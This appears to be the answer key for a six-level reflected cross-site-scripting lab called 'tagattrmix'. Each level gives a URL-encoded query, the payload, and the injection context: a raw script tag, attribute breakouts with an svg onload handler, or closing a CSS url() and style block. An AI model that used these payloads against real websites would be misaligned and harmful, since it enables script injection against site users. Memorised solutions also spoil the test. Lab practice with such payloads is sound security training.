# tagattrmix — solutions

Mixed reflection in tag content and various attributes; pick the simplest breakout.

### tagattrmix-level1

`/tagattrmix/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: both data-info attr and span body — body wins, raw script

### tagattrmix-level2

`/tagattrmix/level2/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: class attribute breakout

### tagattrmix-level3

`/tagattrmix/level3/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: img title attribute breakout

### tagattrmix-level4

`/tagattrmix/level4/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: anchor data-id attribute breakout

### tagattrmix-level5

`/tagattrmix/level5/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: meta content attribute breakout (works in body once head closes)

### tagattrmix-level6

`/tagattrmix/level6/?query=%27)%3C/style%3E%3Csvg%20onload=alert(1)%3E`

- payload: `')</style><svg onload=alert(1)>`
- context: inside style url('...'); close url, close style, inject
